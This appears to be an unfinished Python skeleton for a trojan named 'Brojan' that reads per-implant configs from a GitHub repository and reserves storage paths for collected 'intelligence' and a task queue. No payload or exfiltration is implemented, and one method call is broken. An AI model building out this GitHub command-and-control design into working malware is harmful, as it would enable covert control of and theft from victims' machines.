import json
import base64
import sys
import time
import random
import threading
import queue
import os
from github import *


class GitHubSession():
    username = "mantvydo@gmail.com"
    username = "mantvydasb"
    session = ''

    def __init__(self, username=username):
        password = input("Github password: ")
        self.session = Github(username, password)
        self.repository = self.session.get_repo(self.username + "/network-playground")
        self.branch = self.repository.get_branch("master")

    def getFileContents(self, pathToFile):
        pienas = self.repository.get_contents(pathToFile)
        print(pienas)

    def getConfig(self, id):
        self.getFileContents()


class Brojan():
    id = "1"
    configPath = "brojan/configs/" + id + ".json"
    intelligenceStoragePath = "data/%s/" % id
    modules = []
    configured = False
    tasksQueue = queue.Queue()

    def __init__(self):
        github = GitHubSession()
        github.getFileContents(self.configPath)


Brojan()
